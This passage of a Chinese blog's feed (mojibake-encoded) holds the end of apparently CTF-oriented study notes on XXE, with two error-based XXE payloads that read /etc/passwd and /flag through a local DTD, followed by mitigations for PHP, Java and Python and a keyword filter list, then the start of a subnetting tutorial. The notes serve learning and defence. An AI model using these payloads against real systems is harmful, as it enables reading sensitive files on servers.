data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/xml_1.png" class="lazyload"></a></p><h2 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h2><p>å¦‚æœç›®æ ‡ä¸»æœºçš„é˜²ç«å¢™ååˆ†ä¸¥æ ¼,ä¸å…è®¸æˆ‘ä»¬è¯·æ±‚å¤–ç½‘æœåŠ¡å™¨dtd,é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡å¼•å…¥æœ¬åœ°dtdæ–‡ä»¶å®ç°XXEã€‚</p><p><font color="6495ED">ubuntuç³»ç»Ÿ</font>è‡ªå¸¦ <code>/usr/share/yelp/dtd/docbookx.dtd</code> æ–‡ä»¶</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">xml</div></div><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///usr/share/yelp/dtd/docbookx.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">ISOamso</span> <span class="meta-string">'</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;test&amp;#x25;file;&amp;#x27;&gt;"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">    '</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">message</span> <span class="meta-keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">para1</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">para</span> <span class="meta-string">'</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; para2 "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;para2;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">    '</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %para;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="symbol">&amp;id;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•"><a href="#ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•" class="headerlink" title="ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•"></a>ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure></div><h2 id="è¿‡æ»¤å…³é”®è¯ï¼š"><a href="#è¿‡æ»¤å…³é”®è¯ï¼š" class="headerlink" title="è¿‡æ»¤å…³é”®è¯ï¼š"></a>è¿‡æ»¤å…³é”®è¯ï¼š</h2><ul><li><code>&lt;!DOCTYPE</code> </li><li><code>&lt;!ENTITY</code></li><li><code>SYSTEM</code></li><li><code>PUBLIC</code></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ€è¿‘è«åå¼€å§‹å€’æ—¶å·®ï¼Œæ¯å¤©ä¸‹åˆ5ç‚¹å¤šå¼€å§‹çŠ¯å›°ï¼Œç„¶åä¸€ç¡å°±ç¡åˆ°äº†åŠå¤œèµ·æ¥&lt;br&gt;åªä¼šåšé¢˜æ˜¯ä¸è¡Œçš„ï¼Œè¦å»å­¦ä¹ åŸç†ï¼Œè€Œä¸æ˜¯çº¯ç²¹åšä¸ªè„šæœ¬å°å­&lt;/p&gt;
    
    </summary>
    
    
      <category term="å­¦ä¹ ç¬”è®°" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="çæ‰¯" scheme="https://manayakko.github.io/yakko117/tags/%E7%9E%8E%E6%89%AF/"/>
    
      <category term="code audit" scheme="https://manayakko.github.io/yakko117/tags/code-audit/"/>
    
  </entry>
  
  <entry>
    <title>å­ç½‘åˆ’åˆ†å’Œå­ç½‘æ©ç è®¡ç®—æ–¹æ³•</title>
    <link href="https://manayakko.github.io/yakko117/2020/03/06/ip%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86/"/>
    <id>https://manayakko.github.io/yakko117/2020/03/06/ip%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86/</id>
    <published>2020-03-06T11:09:27.985Z</published>
    <updated>2020-03-06T11:46:52.881Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="å­ç½‘åˆ’åˆ†"><a href="#å­ç½‘åˆ’åˆ†" class="headerlink" title="å­ç½‘åˆ’åˆ†"></a>å­ç½‘åˆ’åˆ†</h1><p><code>å­ç½‘åˆ’åˆ†</code> æ˜¯é€šè¿‡å€Ÿç”¨IPåœ°å€ä¸­è‹¥å¹²ä½ä¸»æœºåœ°å€æ¥å……å½“å­ç½‘çš„ç½‘ç»œåœ°å€ï¼Œä»è€Œå°†åŸç½‘ç»œåˆ’åˆ†ä¸ºè‹¥å¹²å­ç½‘ã€‚</p><h2 id="ä¸ºä»€ä¹ˆåˆ’åˆ†å­ç½‘"><a href="#ä¸ºä»€ä¹ˆåˆ’åˆ†å­ç½‘" class="headerlink" title="ä¸ºä»€ä¹ˆåˆ’åˆ†å­ç½‘"></a>ä¸ºä»€ä¹ˆåˆ’åˆ†å­ç½‘</h2><ul><li>IPåœ°å€ç©ºé—´çš„åˆ©ç”¨ç‡æœ‰æ—¶å€™ä¸é«˜</li></ul><p>ä¸¾ä¸ªä¾‹å­ï¼šåœ¨Aç±»IPåœ°å€ä¸­ï¼Œæ¯ä¸ªAç±»ç½‘ç»œå¯èƒ½æœ‰16777214å°ä¸»æœºï¼Œå®ƒä»¬å¤„äºåŒä¸€å¹¿æ’­åŸŸã€‚åœ¨åŒä¸€å¹¿æ’­åŸŸä¸­æœ‰è¿™ä¹ˆå¤šä¸»æœºæ˜¯ä¸å¯èƒ½çš„ï¼Œç½‘ç»œä¼šå› ä¸ºå¹¿æ’­é€šä¿¡è€Œé¥±å’Œï¼Œå› æ­¤è¦åˆ’åˆ†å­ç½‘å‡å°‘ä¸å¿…è¦çš„ç½‘ç»œæµé‡ <code>(ä¼˜åŒ–ç½‘ç»œæ€§èƒ½)</code>ã€‚</p><ul><li>ä¸¤çº§IPåœ°å€ä¸å¤Ÿçµæ´»</li></ul><p>IPåœ°å€èµ„æºè¶Šæ¥è¶Šå°‘ï¼ŒWANé“¾è·¯æ¯”LANé“¾è·¯çš„é€Ÿåº¦æ…¢å¾—å¤šï¼Œä¸”æ›´æ˜‚è´µ;å¦‚æœçº¯ç²¹ç”¨å¤§è·¨åº¦çš„å¤§å‹ç½‘ç»œï¼Œè¿›è¡Œæµé‡æ•°æ®äº¤äº’ï¼Œåˆ©ç”¨ç‡ä¸é«˜ã€‚<br>å› æ­¤ä¸ºå®ç°æ›´å°çš„å¹¿æ’­åŸŸ <code>(æé«˜ç³»ç»Ÿæ•ˆç‡)</code>ï¼Œå°±éœ€è¦è¿›ä¸€æ­¥åˆ†æˆæ›´å°çš„ç½‘ç»œã€‚åˆ’åˆ†å­ç½‘åï¼Œé€šè¿‡ä½¿ç”¨æ©ç ï¼ŒæŠŠå­ç½‘éšè—èµ·æ¥ï¼Œä½¿å¾—ä»å¤–éƒ¨çœ‹ç½‘ç»œæ²¡æœ‰å˜åŒ–ï¼Œè¿™å°±æ˜¯å­ç½‘æ©ç ã€‚</p><p>å½“æŸä¸ªå•ä½åˆ’åˆ†å­ç½‘åï¼Œå¯¹å¤–ä»ç„¶ <code>è¡¨ç°ä¸ºä¸€ä¸ªç½‘ç»œ</code> ï¼Œé™¤æœ¬å•ä½ä¹‹å¤–çš„ç½‘ç»œçœ‹ä¸è§æœ¬å•ä½çš„å­ç½‘åˆ’åˆ†ã€‚</p><h2 id="å­ç½‘åˆ†ç±»"><a href="#å­ç½‘åˆ†ç±»" class="headerlink" title="å­ç½‘åˆ†ç±»"></a>å­ç½‘åˆ†ç±»</h2><p>åˆ’åˆ†å­ç½‘æ—¶ï¼Œéšç€å­ç½‘åœ°å€å€Ÿç”¨ä¸»æœºä½æ•°çš„å¢å¤šï¼Œå­ç½‘çš„æ•°ç›®éšä¹‹å¢åŠ ï¼Œä½†æ¯ä¸ªå­ç½‘ä¸­çš„å¯ç”¨ä¸»æœºæ•°é€æ¸å‡å°‘ã€‚<br>å¦‚ <code>Cç±»åœ°å€</code>ï¼ŒåŸæœ‰8ä½ä¸»æœºä½ï¼Œ$2^8$-2å³254ä¸ªä¸»æœºåœ°å€ï¼Œé»˜è®¤å­ç½‘æ©ç 255.255.255.0ã€‚(å…¨0æˆ–å…¨1ä¸å¯ç”¨ï¼‰<br>å€Ÿç”¨1ä½ä¸»æœºä½ï¼Œäº§ç”Ÿ$2^1$=2ä¸ªå­ç½‘ï¼Œæ¯ä¸ªå­ç½‘æœ‰$2^7$ä¸ªä¸»æœºåœ°å€;<br>å€Ÿç”¨2ä½ä¸»æœºä½ï¼Œäº§ç”Ÿ$2^2$=4ä¸ªå­ç½‘ï¼Œæ¯ä¸ªå­ç½‘æœ‰$2^6$ä¸ªä¸»æœºåœ°å€;<br>â€¦<br>å…·ä½“å¦‚ä¸‹å›¾<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gcmq2fwftij318d0iddi8.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gcmq2fwftij318d0iddi8.jpg" class="lazyload"></a></p><h2 id="æ˜ç¡®å­ç½‘åˆ’åˆ†çš„éœ€æ±‚"><a href="#æ˜ç¡®å­ç½‘åˆ’åˆ†çš„éœ€æ±‚" class="headerlink" title="æ˜ç¡®å­ç½‘åˆ’åˆ†çš„éœ€æ±‚"></a>æ˜ç¡®å­ç½‘åˆ’åˆ†çš„éœ€æ±‚</h2><ul><li><p>ç¡®å®šéœ€è¦çš„ç½‘ç»œIDæ•°:</p><ul><li>æ¯ä¸ªLANå­ç½‘ä¸€ä¸ª;</li><li>æ¯æ¡å¹¿åŸŸç½‘è¿æ¥ä¸€ä¸ªã€‚</li></ul></li><li><p>ç¡®å®šæ¯ä¸ªå­ç½‘æ‰€éœ€çš„ä¸»æœºæ•°:</p><ul><li>æ¯ä¸ªTCP/IPä¸»æœºä¸€ä¸ª;</li><li>æ¯ä¸ªè·¯ç”±å™¨æ¥å£ä¸€ä¸ªã€‚</li></ul></li><li><p>éœ€è¦ä¸€ä¸ªç”¨äºæ•´ä¸ªç½‘ç»œçš„å­ç½‘æ©ç ;</p><ul><li>æ¯ä¸ªç‰©ç†ç½‘æ®µçš„å”¯ä¸€å­ç½‘ID;</li><li>æ¯ä¸ªå­ç½‘çš„ä¸»æœºèŒƒå›´ã€‚</li></ul></li></ul><hr><h1 id="å­ç½‘æ©ç "><a href="#å­ç½‘æ©ç " class="headerlink" title="å­ç½‘æ©ç "></a>å­ç½‘æ©ç </h1><h2 id="æ¦‚è¿°åŠä½œç”¨"><a href="#æ¦‚è¿°åŠä½œç”¨" class="headerlink" title="æ¦‚è¿°åŠä½œç”¨"></a>æ¦‚è¿°åŠä½œç”¨</h2><ol><li>å­ç½‘æ©ç æ˜¯ä¸€ä¸ªåº”ç”¨äºTCP/IPç½‘ç»œçš„32ä½äºŒè¿›åˆ¶å€¼ï¼Œæ¯èŠ‚8ä½ï¼Œå¿…é¡»ç»“åˆIPåœ°å€å¯¹åº”ä½¿ç”¨ã€‚</li><li>å­ç½‘æ©ç 32ä½éƒ½ä¸IPåœ°å€32ä½å¯¹åº”ï¼Œå¦‚æœæŸä½æ˜¯<font color="6495ED">ç½‘ç»œåœ°å€ï¼Œåˆ™å­ç½‘æ©ç ä¸º1ï¼Œå¦åˆ™ä¸º0ã€‚</font></li><li>å­ç½‘æ©ç å¯ä»¥é€šè¿‡ä¸ <code>IPåœ°å€&quot;ä¸&quot;è®¡ç®—</code>ï¼Œåˆ†ç¦»å‡ºIPåœ°å€ä¸­çš„ç½‘ç»œåœ°å€å’Œä¸»æœºåœ°å€ï¼Œç”¨äºåˆ¤æ–­è¯¥IPåœ°å€æ˜¯åœ¨å±€åŸŸç½‘ä¸Šï¼Œè¿˜æ˜¯åœ¨å¹¿åŸŸç½‘ä¸Šã€‚</li><li>å­ç½‘æ©ç ä¸€èˆ¬ç”¨äºå°†ç½‘ç»œè¿›ä¸€æ­¥åˆ’åˆ†ä¸ºè‹¥å¹²å­ç½‘ï¼Œä»¥é¿å…ä¸»æœºè¿‡å¤šè€Œæ‹¥å µæˆ–è¿‡å°‘è€ŒIPæµªè´¹ã€‚(ä¸Šé¢ä¹Ÿæåˆ°äº†)</li></ol><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gcmq2fv8ckj30pf0fy75p.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gcmq2fv8ckj30pf0fy75p.jpg" class="lazyload"></a></p><h2 id="ä¸ºä»€ä¹ˆè¦ä½¿ç”¨å­ç½‘æ©ç "><a href="#ä¸ºä»€ä¹ˆè¦ä½¿ç”¨å­ç½‘æ©ç " class="headerlink" title="ä¸ºä»€ä¹ˆè¦ä½¿ç”¨å­ç½‘æ©ç "></a>ä¸ºä»€ä¹ˆè¦ä½¿ç”¨å­ç½‘æ©ç </h2><p>å­ç½‘æ©ç å¯ä»¥åˆ†ç¦»å‡ºIPåœ°å€ä¸­çš„ç½‘ç»œåœ°å€å’Œä¸»æœºåœ°å€ï¼Œé‚£ä¸ºä»€ä¹ˆè¦åˆ†ç¦»å‘¢ï¼Ÿå› ä¸ºä¸¤å°è®¡ç®—æœºè¦é€šè®¯ï¼Œé¦–å…ˆè¦åˆ¤æ–­æ˜¯å¦å¤„äºåŒä¸€ä¸ªå¹¿æ’­åŸŸå†…ï¼Œå³ç½‘ç»œåœ°å€æ˜¯å¦ç›¸åŒã€‚å¦‚æœç½‘ç»œåœ°å€ç›¸åŒï¼Œè¡¨æ˜æ¥å—æ–¹åœ¨æœ¬ç½‘ç»œä¸Šï¼Œé‚£ä¹ˆå¯ä»¥æŠŠæ•°æ®åŒ…ç›´æ¥å‘é€åˆ°ç›®æ ‡ä¸»æœºï¼Œ<font color="6495ED">å¦åˆ™å°±éœ€è¦è·¯ç”±ç½‘å…³å°†æ•°æ®åŒ…è½¬å‘é€åˆ°ç›®çš„åœ°ã€‚</font></p><hr><h2 id="å­ç½‘æ©ç çš„åˆ†ç±»"><a href="#å­ç½‘æ©ç çš„åˆ†ç±»" class="headerlink" title="å­ç½‘æ©ç çš„åˆ†ç±»"></a>å­ç½‘æ©ç çš„åˆ†ç±»</h2><h3 id="ç¼ºçœå­ç½‘æ©ç ï¼š"><a href="#ç¼ºçœå­ç½‘æ©ç ï¼š" class="headerlink" title="ç¼ºçœå­ç½‘æ©ç ï¼š"></a>ç¼ºçœå­ç½‘æ©ç ï¼š</h3><p>(æœªåˆ’åˆ†å­ç½‘)<br>å­ç½‘æ©ç 32ä½ä¸IPåœ°å€32ä½å¯¹åº”,å¦‚æœæŸä½æ˜¯ç½‘ç»œåœ°å€ï¼Œåˆ™å­ç½‘æ©ç ä¸º1ï¼Œå¦åˆ™ä¸º0ã€‚<br>ä¾‹å¦‚Aç±»IPåœ°å€ï¼Œç¬¬ä¸€èŠ‚ä¸ºç½‘ç»œåœ°å€ï¼Œå…¶ä½™ä¸‰èŠ‚ä¸ºä¸»æœºåœ°å€<br>æ•…æ©ç ä¸º<code>11111111.00000000.00000000.00000000</code></p><p><font color="6495ED">Aç±»ç½‘ç»œ</font> ç¼ºçœå­ç½‘æ©ç ï¼š<code>255.0.0.0</code><br><font color="6495ED">Bç±»ç½‘ç»œ</font> ç¼ºçœå­ç½‘æ©ç ï¼š<code>255.255.0.0</code><br><font color="6495ED">Cç±»ç½‘ç»œ</font> ç¼ºçœå­ç½‘æ©ç ï¼š<code>255.255.255.0</code></p><h3 id="è‡ªå®šä¹‰å­ç½‘æ©ç ï¼š"><a href="#è‡ªå®šä¹‰å­ç½‘æ©ç ï¼š" class="headerlink" title="è‡ªå®šä¹‰å­ç½‘æ©ç ï¼š"></a>è‡ªå®šä¹‰å­ç½‘æ©ç ï¼š</h3><p>å°†ä¸€ä¸ªç½‘ç»œåˆ’åˆ†ä¸ºè‹¥å¹²å­ç½‘ï¼Œå¸Œæœ›æ¯ä¸ªå­ç½‘æ‹¥æœ‰ä¸åŒçš„ç½‘ç»œåœ°å€æˆ–å­ç½‘åœ°å€ã€‚å› ä¸ºï¼©ï¼°æ˜¯æœ‰é™çš„ï¼Œå®é™…ä¸Šæˆ‘ä»¬æ˜¯å°†ä¸»æœºåœ°å€åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼šå­ç½‘ç½‘ç»œåœ°å€ã€å­ç½‘ä¸»æœºåœ°å€ã€‚å½¢å¼å¦‚ä¸‹ï¼š<br>æœªåšå­ç½‘åˆ’åˆ†çš„ipåœ°å€ï¼š<strong>ç½‘ç»œåœ°å€ï¼‹ä¸»æœºåœ°å€</strong><br>åšå­ç½‘åˆ’åˆ†åçš„ipåœ°å€ï¼š<strong>ç½‘ç»œåœ°å€ï¼‹ï¼ˆå­ç½‘ç½‘ç»œåœ°å€ï¼‹å­ç½‘ä¸»æœºåœ°å€ï¼‰</strong></p><h3 id="å­ç½‘æ©ç å’Œipåœ°å€çš„å…³ç³»"><a href="#å­ç½‘æ©ç å’Œipåœ°å€çš„å…³ç³»" class="headerlink" title="å­ç½‘æ©ç å’Œipåœ°å€çš„å…³ç³»"></a>å­ç½‘æ©ç å’Œipåœ°å€çš„å…³ç³»</h3><p>è®¾IPåœ°å€ä¸º192.168.10.2ï¼Œå­ç½‘æ©ç ä¸º255.255.255.240ï¼Œé‚£ä¹ˆå­ç½‘æ©ç æ˜¯æ€æ ·æ¥åŒºåˆ†ç½‘ç»œåœ°å€å’Œä¸»æœºåœ°å€çš„å‘¢ã€‚</p><p>ä¸»æœºåœ°å€ä¸ºï¼š0.0.0.2ï¼ˆå°†æ©ç å–åï¼Œç„¶åä¸IPåœ°å€è¿›è¡Œä¸è¿ç®—ï¼‰</p><p><font color="6495ED">ä¸è¿ç®—</font>:å¯¹åº”ä½å…¨æ˜¯ <code>1</code> ç»“æœä¸º <code>1</code> ,å¦åˆ™ä¸º <code>0</code><br><font color="6495ED">æˆ–è¿ç®—</font>:å¯¹åº”ä½å…¨æ˜¯ <code>0</code> ç»“æœä¸º <code>0</code>, å¦åˆ™ä¸º <code>1</code></p><hr><h1 id="å­ç½‘æ©ç ä¹ é¢˜"><a href="#å­ç½‘æ©ç ä¹ é¢˜" class="headerlink" title="å­ç½‘æ©ç ä¹ é¢˜"></a>å­ç½‘æ©ç ä¹ é¢˜</h1><h2 id="ä¾‹-1"><a href="#ä¾‹-1" class="headerlink" title="ä¾‹ 1"></a>ä¾‹ 1</h2><p><strong>å·²çŸ¥IPåœ°å€æ˜¯ <code>141.14.72.24</code>ï¼Œ å­ç½‘æ©ç æ˜¯ <code>255.255.192.0</code> æ±‚ç½‘ç»œåœ°å€</strong></p><h3 id="è§£ç­”"><a href="#è§£ç­”" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><p>é¦–å…ˆé€šè¿‡å­ç½‘æ©ç å’ŒIPåœ°å€è¿›è¡Œä¸è¿ç®—ï¼Œå¯ä»¥æ¨æ–­ç½‘ç»œåœ°å€ä¸º <code>141.14.xx.0</code></p><p>ç„¶ååªéœ€è¦çŸ¥é“ <code>72</code> å’Œ <code>192</code> çš„äºŒè¿›åˆ¶<br>é¦–å…ˆ <code>72</code> = <code>0100 1000</code><br>ç„¶å <code>192</code>= <code>1100 0000</code><br>è¿›è¡Œä¸è¿ç®—å¯ä»¥å¾—åˆ° <code>0100 0000</code> = <code>64</code></p><p>åŒæ—¶å¯ä»¥çŸ¥é“ <code>1100 0000</code> å­ç½‘å·å äº† <code>2</code> ä¸ªä½ï¼Œå‰©ä¸‹14ï¼ˆ6+8ï¼‰ä½ä¸ºä¸»æœºå·ï¼Œå³æœ‰ $2^{14}$ ä¸ªä¸»æœº</p><p>ä¸»æœºå·å…¨ <code>0</code> è¡¨ç¤ºè¿™ä¸ªç½‘ç»œæ®µæœ¬èº«ç§°ä¹‹ä¸º: <code>ç½‘ç»œå·</code><br>ä¸»æœºå·å…¨ <code>1</code> çš„åœ°å€ç§°ä¹‹ä¸º: <code>å¹¿æ’­åœ°å€</code></p><p>ç„¶åå†™ä¸ªè¡¨ï¼Œç”¨æ¥è®°ä¸€ä¸‹å¸¸è§„æ•°æ®çš„äºŒè¿›åˆ¶<br>|äºŒè¿›åˆ¶|åè¿›åˆ¶|<br>|:â€”-:|â€”:|<br>|1000 0000|128|<br>|1100 0000|192|<br>|1110 0000|224|<br>|1111 0000|240|<br>|1111 1000|248|<br>|1111 1100|252|<br>|1111 1110|254|<br>|1111 1111|255|</p><hr><h2 id="ä¾‹é¢˜2"><a href="#ä¾‹é¢˜2" class="headerlink" title="ä¾‹é¢˜2"></a>ä¾‹é¢˜2</h2><p><strong>æŸä¸»æœºçš„ <code>IPåœ°å€</code>ä¸º <code>180.80.77.55</code>ï¼Œå­ç½‘æ©ç ä¸º <code>255.255.252.0</code>ã€‚è‹¥è¯¥ä¸»æœºå‘å…¶æ‰€åœ¨çš„å­ç½‘å‘é€å¹¿æ’­åˆ†ç»„ï¼Œåˆ™ç›®çš„åœ°å€å¯ä»¥ä¸º</strong></p><p>A. 180.80.76.0<br>B. 180.80.76.255<br>C. 180.80.77.255<br>D. 180.80.79.255</p><h3 id="è§£ç­”-1"><a href="#è§£ç­”-1" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><p>é¦–å…ˆå€¼å¾—æ³¨æ„æ˜¯å‘å­ç½‘å‘é€ <font color="6495ED">å¹¿æ’­åˆ†ç»„</font><br><font color="6495ED">å¹¿æ’­åˆ†ç»„</font> å³ä¸º <font color="6495ED">å¹¿æ’­åœ°å€</font> ä¹Ÿå°±æ˜¯ä¸»æœºå·å…¨ <code>1</code></p><p>å› æ­¤å¯ä»¥é¦–å…ˆæ’é™¤Aé€‰é¡¹ï¼Œç„¶åå¯ä»¥å…³æ³¨åˆ°å­ç½‘æ©ç çš„ç¬¬ä¸‰ä¸ªä½ç½®æ˜¯ <code>252</code><br>ç”±ä¸Šé¢çš„è¡¨å¯ä»¥çŸ¥é“äºŒè¿›åˆ¶ç¼–ç ä¸º <code>1111 1100</code><br>ä¹Ÿå°±æ˜¯è¯´å‰é¢å…±æœ‰ <code>8+8+6=22</code> ä½ä¸º <font color="6495ED">ç½‘ç»œå·+å­ç½‘å·</font> åé¢çš„ <code>10ä½</code> ä¸ºä¸»æœºå·<br>ç„¶åçœ‹ <code>IPåœ°å€</code> <code>180.80.77.55</code><br>77 = <font color="6495ED">0100 11</font>01<br>å¯ä»¥åˆ¤æ–­ä¸»æœºæ‰€åœ¨çš„å­ç½‘å·ä¸º <code>180.80.76.xxx</code><br>ç„¶åå› ä¸ºè¦æ‰¾çš„æ˜¯<font color="6495ED">ç›®çš„åœ°å€</font>ï¼Œæ‰€ä»¥æ‰€æœ‰çš„ä¸»æœºå·éƒ½è¦ä¸º 1ï¼Œæ‰€ä»¥ç¬¬ä¸‰ä½ipåº”è¯¥å˜æˆ <font color="6495ED">0100 1111</font> å³ä¸º 76+3=79ï¼Œæ‰€ä»¥ç­”æ¡ˆé€‰ D</p><hr><h1 id="è·¯ç”±å™¨è½¬å‘åˆ†ç»„çš„ç®—æ³•"><a href="#è·¯ç”±å™¨è½¬å‘åˆ†ç»„çš„ç®—æ³•" class="headerlink" title="è·¯ç”±å™¨è½¬å‘åˆ†ç»„çš„ç®—æ³•"></a>è·¯ç”±å™¨è½¬å‘åˆ†ç»„çš„ç®—æ³•</h1><h2 id="æå–ç›®çš„IPåœ°å€"><a href="#æå–ç›®çš„IPåœ°å€" class="headerlink" title="æå–ç›®çš„IPåœ°å€"></a>æå–ç›®çš„IPåœ°å€</h2><p>ä»åˆ†ç»„çš„é¦–éƒ¨æå–ç›®çš„IPåœ°å€ <code>D</code></p><h2 id="æ˜¯å¦ç›´æ¥äº¤ä»˜"><a href="#æ˜¯å¦ç›´æ¥äº¤ä»˜" class="headerlink" title="æ˜¯å¦ç›´æ¥äº¤ä»˜"></a>æ˜¯å¦ç›´æ¥äº¤ä»˜</h2><p>å…ˆç”¨<font color="6495ED">ä¸è¯¥è·¯ç”±å™¨ç›´æ¥ç›¸è¿çš„ç½‘ç»œ</font>çš„å­ç½‘æ©ç ä¸IPåœ°å€ <code>D</code> è¿›è¡Œä¸è¿ç®—ï¼Œçœ‹ç»“æœæ˜¯å¦ä¸ç›¸åº”çš„ç½‘ç»œï¼Œåœ°å€ç›¸åŒ¹é…ã€‚è‹¥åŒ¹é…ï¼Œåˆ™è¿›è¡Œç›´æ¥äº¤ä»˜ã€‚å¦åˆ™å°±æ˜¯é—´æ¥äº¤ä»˜ï¼Œé©¬ä¸Šæ‰§è¡Œä¸‹ä¸€æ­¥</p><h2 id="ç‰¹å®šä¸»æœºè·¯ç”±"><a href="#ç‰¹å®šä¸»æœºè·¯ç”±" class="headerlink" title="ç‰¹å®šä¸»æœºè·¯ç”±"></a>ç‰¹å®šä¸»æœºè·¯ç”±</h2><p>è‹¥è·¯ç”±è¡¨ä¸­æœ‰ä¸€æ¡åˆ°ç›®çš„ä¸»æœº <code>D</code> çš„ç‰¹å®šè·¯ç”±ï¼Œåˆ™å°†åˆ†ç»„è½¬å‘ç»™å…¶æŒ‡æ˜çš„ä¸‹ä¸€è·³è·¯ç”±å™¨ã€‚å¦åˆ™æ‰§è¡Œä¸‹ä¸€æ­¥</p><h2 